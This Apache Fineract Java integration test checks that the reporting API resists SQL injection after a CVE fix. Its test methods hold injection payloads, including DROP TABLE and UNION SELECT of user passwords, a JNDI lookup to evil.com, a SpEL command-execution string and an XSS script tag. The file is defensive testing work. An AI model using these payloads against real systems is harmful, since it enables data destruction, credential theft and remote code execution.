/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements. See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership. The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied. See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
package org.apache.fineract.integrationtests;

import static org.apache.fineract.client.feign.util.FeignCalls.ok;
import static org.apache.http.HttpStatus.SC_BAD_REQUEST;
import static org.apache.http.HttpStatus.SC_NOT_FOUND;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import lombok.extern.slf4j.Slf4j;
import org.apache.fineract.client.feign.services.ReportsApi;
import org.apache.fineract.client.feign.services.RunReportsApi;
import org.apache.fineract.client.feign.util.CallFailedRuntimeException;
import org.apache.fineract.client.models.GetReportsResponse;
import org.apache.fineract.client.models.PostRepostRequest;
import org.apache.fineract.integrationtests.common.FineractFeignClientHelper;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * Comprehensive integration tests for SQL injection prevention in reporting functionality.
 *
 * Tests the migration from ESAPI to native database escaping and validates that CVE-2025-5878 is fixed. Covers
 * ReadReportingServiceImpl security measures through actual API endpoints.
 */
@Slf4j
public class SqlInjectionReportingServiceIntegrationTest {

    private Long testReportId = null;
    private Long booleanReportId = null;
    private static final String TEST_REPORT_NAME = "SQL_Injection_Test_Report";
    private static final String TEST_REPORT_SQL = "SELECT 1 as test_column, 'Test Data' as test_name";
    private static final String BOOLEAN_REPORT_SQL = "SELECT (1 = 1) AS active";
    private static final String TEST_REPORT_COLUMN = "test_column";
    private static final String BOOLEAN_REPORT_COLUMN = "active";
    private static final String REPORT_TYPE_TABLE = "Table";
    private static final String REPORT_CATEGORY_CLIENT = "Client";
    private static final String GENERIC_RESULT_SET_PARAM = "genericResultSet";
    private static final String REPORT_TYPE_PARAM = "reportType";
    private String booleanReportName;

    @BeforeEach
    public void setup() {
        Locale.setDefault(Locale.ENGLISH);
        // Create test report for the tests
        createTestReportIfNotExists();
    }

    @AfterEach
    public void cleanup() {
        // Clean up test report after tests
        if (testReportId != null) {
            try {
                deleteReport(testReportId);
            } catch (Exception e) {
                log.warn("Failed to clean up test report: {}", e.getMessage());
            } finally {
                testReportId = null;
            }
        }
        if (booleanReportId != null) {
            try {
                deleteReport(booleanReportId);
            } catch (Exception e) {
                log.warn("Failed to clean up boolean test report: {}", e.getMessage());
            } finally {
                booleanReportId = null;
                booleanReportName = null;
            }
        }
    }

    private void createTestReportIfNotExists() {
        try {
            Long existingId = findReportIdByName(TEST_REPORT_NAME);
            // First try to get the report to see if it exists - use direct RestAssured call to handle 404
            if (existingId != null) {
                testReportId = existingId;
                log.info("Found existing test report '{}' with ID: {}", TEST_REPORT_NAME, testReportId);
                // Extract the ID for cleanup
                return;
            }
        } catch (CallFailedRuntimeException e) {
            log.debug("Report list fetch failed with status {}, will try to create report: {}", e.getStatus(), e.getResponseBody());
        }

        try {
            // Use direct RestAssured call to handle different response codes
            testReportId = ok(() -> reports()
                    .createReport(reportRequest(TEST_REPORT_NAME, TEST_REPORT_SQL, "Test report for SQL injection prevention tests")))
                    .getResourceId();
            if (testReportId == null) {
                // Extract report ID from response for cleanup
                throw new RuntimeException("Test report creation failed - no resourceId in the response");
            }
            log.info("Created test report with ID: {}", testReportId);
        } catch (RuntimeException e) {
            // This is a critical failure - tests cannot proceed without the test report
            throw new RuntimeException(
                    "CRITICAL: Could not create test report '" + TEST_REPORT_NAME + "'. Tests cannot proceed. Error: " + e.getMessage(), e);
        }
    }

    private void createBooleanReport() {
        booleanReportName = "BOOLEAN_Runreports_Test_Report_" + UUID.randomUUID();

        booleanReportId = ok(() -> reports()
                .createReport(reportRequest(booleanReportName, BOOLEAN_REPORT_SQL, "Test report for BOOLEAN runreports support")))
                .getResourceId();
        if (booleanReportId == null) {
            throw new RuntimeException("BOOLEAN test report creation failed - no resourceId in the response");
        }
        log.info("Created BOOLEAN test report with ID: {}, name: {}", booleanReportId, booleanReportName);
    }

    private void deleteReport(Long reportId) {
        if (reportId == null) {
            return;
        }
        try {
            ok(() -> reports().deleteReport(reportId));
            log.info("Deleted test report with ID: {}", reportId);
        } catch (CallFailedRuntimeException e) {
            // Treat an already-absent report as successfully cleaned up. Compare the status code itself: the message
            // embeds the request path, so a report whose id contains "404" would match a naive substring check.
            if (e.getStatus() == SC_NOT_FOUND) {
                log.info("Test report with ID {} already absent", reportId);
                return;
            }
            throw new RuntimeException("Failed deleting test report with ID " + reportId + ", status: " + e.getStatus(), e);
        }
    }

    /** Finds a report id by exact name, or {@code null} when no report of that name exists. */
    private static Long findReportIdByName(String reportName) {
        return ok(() -> reports().retrieveAllReports()).stream()//
                .filter(report -> reportName.equals(report.getReportName()))//
                .map(GetReportsResponse::getId)//
                .findFirst()//
                .orElse(null);
    }

    private static PostRepostRequest reportRequest(String reportName, String reportSql, String description) {
        return new PostRepostRequest()//
                .reportName(reportName)//
                .reportType(REPORT_TYPE_TABLE)//
                .reportCategory(REPORT_CATEGORY_CLIENT)//
                .reportSql(reportSql)//
                .description(description)//
                .useReport(true);
    }

    /**
     * UC1: Test legitimate report execution works correctly Validates that the SQL injection prevention doesn't break
     * normal functionality
     */
    @Test
    void uc1_testLegitimateReportExecution() {
        log.info("Testing that legitimate reports still work after SQL injection prevention");

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        // Test with the test report we created in setup - this MUST succeed
        List<Map<String, Object>> rows = runReport(TEST_REPORT_NAME, queryParams);

        assertNotNull(rows);
        assertFalse(rows.isEmpty(), "The report should return at least one row");

        // Debug: Log actual response to understand structure
        log.info("Response from report execution: {}", rows);

        // Verify response is valid JSON structure
        assertTrue(rows.stream().allMatch(row -> row.containsKey(TEST_REPORT_COLUMN)),
                "Every row should carry the report's own column, but got: " + rows);
    }

    /**
     * UC2: Test parameter injection through query parameters Validates that malicious content in query parameters is
     * also properly handled
     */
    @Test
    void uc2_testParameterInjectionPrevention() {
        log.info("Testing parameter injection prevention through query parameters");

        Map<String, String> maliciousParams = new HashMap<>();
        maliciousParams.put("R_officeId", "1'; DROP TABLE m_office; --");
        maliciousParams.put("R_startDate", "2023-01-01' UNION SELECT * FROM m_appuser --");
        maliciousParams.put("R_endDate", "2023-12-31'); DELETE FROM stretchy_report; --");

        // Test with legitimate report name but malicious parameters
        // This should either succeed with empty/safe results or fail with validation error
        // but NOT with SQL syntax errors
        try {
            runReport(TEST_REPORT_NAME, maliciousParams);
            // If we get here, the SQL injection was prevented and handled safely
            log.info("SQL injection prevented - query executed safely with malicious parameters");
        } catch (CallFailedRuntimeException exception) {
            // The response should indicate parameter validation error or safe handling
            // NOT SQL syntax errors which would indicate successful injection
            assertNoSqlError(exception);
            // Should be a validation error, not a 404
            assertNotEquals(SC_NOT_FOUND, exception.getStatus(),
                    "Should not get 404 - report should exist. Got: " + exception.getMessage());
            log.info("Got expected validation error: {}", exception.getMessage());
        }
    }

    /**
     * UC3: Test type validation whitelist - only 'report' and 'parameter' types should be allowed This validates the
     * whitelist implementation for report types
     */
    @ParameterizedTest(name = "Report Type Validation: {0}")
    @ValueSource(strings = { "report", "parameter" })
    void uc3_testValidReportTypes(String validType) {
        log.info("Testing valid report type: {}", validType);

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        // Test that valid report types work through the API
        try {
            runReport("TestReport", withReportType(queryParams, validType));
            // Should get a proper response or 404 (report not found), not validation error
        } catch (CallFailedRuntimeException e) {
            // For valid types, we expect 404 (report not found), not validation errors
            assertEquals(SC_NOT_FOUND, e.getStatus(), "Expected 404 for a valid report type, got: " + e.getMessage());
        }
    }

    /**
     * UC4: Test invalid report types that should be rejected by whitelist
     */
    @ParameterizedTest(name = "Invalid Report Type: {0}")
    @ValueSource(strings = { "table", "view", "procedure", "function", "schema", "database", "admin", "user", "system", "config" })
    void uc4_testInvalidReportTypes(String invalidType) {
        log.info("Testing invalid report type: {}", invalidType);

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        // These should be rejected and result in 404 (report not found) or validation error
        CallFailedRuntimeException exception = assertThrows(CallFailedRuntimeException.class,
                () -> runReport("TestReport", withReportType(queryParams, invalidType)));

        // Should get 404 or validation error, not SQL execution error
        assertTrue(exception.getStatus() == SC_NOT_FOUND || exception.getResponseBody().toLowerCase(Locale.ROOT).contains("validation"),
                "Expected 404 or a validation error, got: " + exception.getMessage());
        assertFalse(exception.getMessage().toLowerCase().contains("sql syntax"));
    }

    /**
     * UC5: Test database-specific escaping through API behavior for MySQL/MariaDB
     */
    @Test
    void uc5_testMySQLEscapingThroughAPI() {
        log.info("Testing MySQL/MariaDB escaping behavior through API");

        // Test MySQL special characters in parameters
        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1' OR '1'='1");
        queryParams.put("R_clientId", "1; DROP TABLE m_client;");
        queryParams.put("R_startDate", "2023-01-01\\' OR 1=1 --");

        // Use the real test report to ensure SQL injection prevention works with actual queries
        try {
            assertNotNull(runReport(TEST_REPORT_NAME, queryParams));
            // If successful, the special characters were safely escaped
            log.info("MySQL/MariaDB special characters safely escaped");
        } catch (CallFailedRuntimeException e) {
            // Should not get SQL syntax errors - only validation errors
            assertNoSqlError(e);
            log.info("MySQL/MariaDB escaping prevented SQL injection with validation error");
        }
    }

    /**
     * UC6: Test database-specific escaping through API for PostgreSQL
     */
    @Test
    void uc6_testPostgreSQLEscapingThroughAPI() {
        log.info("Testing PostgreSQL escaping behavior through API");

        // Test PostgreSQL-specific SQL injection patterns
        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1'::text OR '1'='1");
        queryParams.put("R_clientId", "1; DROP TABLE m_client CASCADE;");
        queryParams.put("R_startDate", "2023-01-01'::date OR TRUE --");
        queryParams.put("R_endDate", "$$; DROP TABLE m_client; $$");

        // Use the real test report to ensure SQL injection prevention works
        try {
            assertNotNull(runReport(TEST_REPORT_NAME, queryParams));
            // If successful, the PostgreSQL special syntax was safely escaped
            log.info("PostgreSQL special characters and syntax safely escaped");
        } catch (CallFailedRuntimeException e) {
            // Should not get SQL syntax errors - only validation errors
            assertNoSqlError(e);
            assertFalse(e.getMessage().toLowerCase().contains("error") && e.getMessage().toLowerCase().contains("position"),
                    "Should not get PostgreSQL position error. Got: " + e.getMessage());
            log.info("PostgreSQL escaping prevented SQL injection with validation error");
        }
    }

    /**
     * UC7: Test concurrent access to ensure thread safety through API
     */
    @Test
    void uc7_testConcurrentAccess() throws InterruptedException, ExecutionException {
        log.info("Testing concurrent access to SQL injection prevention through API");

        int threadCount = 5;
        int operationsPerThread = 3;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);

        List<Future<Boolean>> futures = new ArrayList<>();

        for (int i = 0; i < threadCount; i++) {
            final int threadId = i;
            Future<Boolean> future = executor.submit(new Callable<Boolean>() {

                @Override
                public Boolean call() {
                    try {
                        for (int j = 0; j < operationsPerThread; j++) {
                            String input = "test-input-" + threadId + "-" + j;

                            Map<String, String> queryParams = new HashMap<>();
                            queryParams.put("R_officeId", "1");

                            runReport(input, queryParams);
                        }
                        return true;
                    } catch (CallFailedRuntimeException e) {
                        // 404 is expected for non-existent reports
                        if (e.getStatus() == SC_NOT_FOUND) {
                            return true;
                        }
                        log.error("Error in thread {}: {}", threadId, e.getMessage());
                        return false;
                    }
                }
            });
            futures.add(future);
        }

        executor.shutdown();
        assertTrue(executor.awaitTermination(60, TimeUnit.SECONDS), "All threads should complete within 60 seconds");

        for (Future<Boolean> future : futures) {
            assertTrue(future.get(), "All concurrent operations should succeed or return 404");
        }

        log.info("Concurrent access test completed successfully with {} threads and {} operations per thread", threadCount,
                operationsPerThread);
    }

    /**
     * UC8: Test report parameter injection with complex nested structures
     */
    @Test
    void uc8_testComplexParameterInjection() {
        log.info("Testing complex parameter injection scenarios");

        // Test various parameter injection patterns that were historically problematic
        Map<String, String> maliciousParams = new HashMap<>();
        maliciousParams.put("R_officeId", "1) UNION SELECT username,password FROM m_appuser WHERE id=1--");
        maliciousParams.put("R_clientId", "${jndi:ldap://evil.com/a}");
        maliciousParams.put("R_startDate", "'; DROP TABLE IF EXISTS test; --");
        maliciousParams.put("R_endDate", "#{T(java.lang.Runtime).getRuntime().exec('whoami')}");
        maliciousParams.put("R_userId", "<script>alert('xss')</script>");

        try {
            runReport(TEST_REPORT_NAME, maliciousParams);
            // If we get here without exception, the response should be safe
            log.info("Complex parameter injection prevented - query executed safely");
        } catch (CallFailedRuntimeException e) {
            // Should get parameter validation error, not SQL injection
            assertNoSqlError(e);
            assertFalse(e.getMessage().toLowerCase().contains("table") && e.getMessage().toLowerCase().contains("exist"),
                    "Should not get table exists error. Got: " + e.getMessage());
        }
    }

    /**
     * UC9: Test legitimate reports with various parameter types
     */
    @ParameterizedTest(name = "Parameter Type: {0}")
    @CsvSource(delimiterString = " | ", value = { "R_officeId | 1 | Numeric parameter", "R_startDate | 2023-01-01 | Date parameter",
            "R_endDate | 2023-12-31 | Date parameter", "R_currencyId | USD | String parameter", "R_loanProductId | 1 | Numeric parameter" })
    void uc9_testLegitimateParameterTypes(String paramName, String paramValue, String description) {
        log.info("Testing legitimate parameter: {} = {} ({})", paramName, paramValue, description);

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put(paramName, paramValue);

        try {
            // Valid parameters should return data successfully; a SQL error would have failed the call instead
            // Valid parameters should return data successfully
            // Should not contain SQL error indicators
            assertNotNull(runReport(TEST_REPORT_NAME, queryParams));

            log.debug("Legitimate parameter '{}' = '{}' processed successfully", paramName, paramValue);
        } catch (CallFailedRuntimeException e) {
            // For legitimate parameters, we should not get errors unless it's a data issue
            // But definitely not SQL syntax errors
            assertNoSqlError(e);
            log.info("Parameter validation for '{}' = '{}': {}", paramName, paramValue, e.getMessage());
        }
    }

    /**
     * UC10: Test cross-database compatibility through API
     */
    @Test
    void uc10_testCrossDatabaseCompatibility() {
        log.info("Testing cross-database compatibility for SQL injection prevention through API");

        String testInput = "test-input-with-special-chars";

        Map<String, String> queryParams = new HashMap<>();
        queryParams.put("R_officeId", "1");

        try {
            runReport(testInput, queryParams);
        } catch (CallFailedRuntimeException e) {
            assertTrue(e.getStatus() == SC_NOT_FOUND || e.getStatus() == SC_BAD_REQUEST,
                    "Expected safe failure (404/400), but got: " + e.getMessage());
            assertFalse(e.getMessage().toLowerCase().contains("syntax error"));
            assertFalse(e.getMessage().toLowerCase().contains("sql"));

            log.info("Cross-database compatibility test passed - got expected safe response");
        }
    }

    /**
     * Helper method to convert parameters map to query string
     */
    @Test
    void shouldExecuteReportSuccessfullyWhenReportContainsBooleanColumn() {
        createBooleanReport();
        assertNotNull(booleanReportId, "BOOLEAN test report should be created before execution");
        assertNotNull(booleanReportName, "BOOLEAN test report name should be initialized");

        // A successful run returns the rows; a non-2xx status throws and fails the test
        // Use direct request to avoid hidden auth mismatch and assert exact behavior
        List<Map<String, Object>> rows = runReport(booleanReportName, Map.of());

        assertNotNull(rows);
        assertFalse(rows.isEmpty(), "The BOOLEAN report should return a row");
        Map<String, Object> row = rows.get(0);
        assertTrue(row.containsKey(BOOLEAN_REPORT_COLUMN), "Response should contain boolean column alias 'active', but was: " + rows);
        Object active = row.get(BOOLEAN_REPORT_COLUMN);
        assertTrue(Boolean.TRUE.equals(active) || "true".equalsIgnoreCase(String.valueOf(active)) || "1".equals(String.valueOf(active)),
                "Response should contain boolean value (true/1), but was: " + rows);
    }

    private void assertNoSqlError(RuntimeException exception) {
        assertFalse(exception.getMessage().toLowerCase().contains("syntax error"),
                "Should not get SQL syntax error, got: " + exception.getMessage());
        assertFalse(exception.getMessage().toLowerCase().contains("you have an error in your sql"),
                "Should not get SQL error, got: " + exception.getMessage());
    }

    /**
     * Runs a report with {@code genericResultSet=false}, the shape the pre-migration test asserted on: the server
     * answers a plain array of rows rather than the {@code columnHeaders}/{@code data} Generic Resultset. Both shapes
     * come out of the same {@code retrieveGenericResultset} call the SQL-injection prevention lives in.
     */
    private List<Map<String, Object>> runReport(String reportName, Map<String, String> parameters) {
        Map<String, String> queryParameters = new HashMap<>(parameters);
        queryParameters.put(GENERIC_RESULT_SET_PARAM, "false");
        return ok(() -> runReports().runReportGetRows(reportName, queryParameters));
    }

    private static Map<String, String> withReportType(Map<String, String> parameters, String reportType) {
        Map<String, String> queryParameters = new HashMap<>(parameters);
        queryParameters.put(REPORT_TYPE_PARAM, reportType);
        return queryParameters;
    }

    private static ReportsApi reports() {
        return FineractFeignClientHelper.getFineractFeignClient().reports();
    }

    private static RunReportsApi runReports() {
        return FineractFeignClientHelper.getFineractFeignClient().runReports();
    }
}
